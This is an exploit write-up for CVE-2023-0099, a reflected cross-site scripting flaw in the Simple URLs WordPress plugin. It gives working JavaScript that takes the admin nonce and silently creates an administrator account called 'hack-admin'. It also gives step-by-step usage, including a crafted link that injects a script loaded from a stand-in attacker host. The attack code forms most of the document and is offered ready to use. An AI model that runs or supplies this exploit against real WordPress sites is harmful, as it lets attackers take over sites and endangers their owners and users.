# CVE-2023-0099-exploit

### Exploit Title: simple urls < 115 - Reflected XSS
### Google Dork: 
### Exploit Author: AmirZargham
### Vendor Homepage: https://getlasso.co/
### Software Link: https://wordpress.org/plugins/simple-urls/
### Version: < 115
### Tested on: firefox,chrome
### CVE: CVE-2023-0099
### CWE: CWE-79
### Platform: MULTIPLE
### Type: WebApps


Description
The Simple URLs WordPress plugin before 115 does not sanitise and escape some parameters before outputting them back in some pages, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin.


Exploit:
```javascript
function getCSRFToken(url, csrf_token_id, func){
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
if(this.readyState == 4 && this.status == 200){
var parser = new DOMParser();
var htmlDocument = parser.parseFromString(this.responseText, "text/html");
var token = htmlDocument.getElementById(csrf_token_id).value;
func(token);
}

};
xhr.open("GET", url, true);
xhr.withCredentials = true;
xhr.send();

}

function addAdmin(token){
var xhr = new XMLHttpRequest();
xhr.open("POST","http://vulnerable.site/wp-admin/user-new.php", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("action=createuser&_wpnonce_create-user=" + token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=hack-admin&email=hack@gmail.com&first_name=&last_name=&url=&pass1=1234&pass2=1234&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User");
}

getCSRFToken("http://vulnerable.site/wp-admin/user-new.php", "_wpnonce_create-user", addAdmin);
```

Usage Info:
1. save exploit code to server as javascript file.
2. in exploit file change value:
    * user_login: Arbitrary username
    * pass1: Arbitrary password
    * pass2: Arbitrary password
    * email: Arbitrary email
3. now send malicious link to victim: `https://vulnerable.com/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=</script><script src="https://attacker.com/exploit.js"></script>`
4. know Admin user was created, go to /wp-admin or etc, and login to wordpress panel.


#### Published in: [exploit-db](https://www.exploit-db.com/search?e_author=amirzargham).
#### Published in: [0day.today](https://0day.today/author/46852).
#### Published in: [packet storm](https://packetstormsecurity.com/files/author/16843).
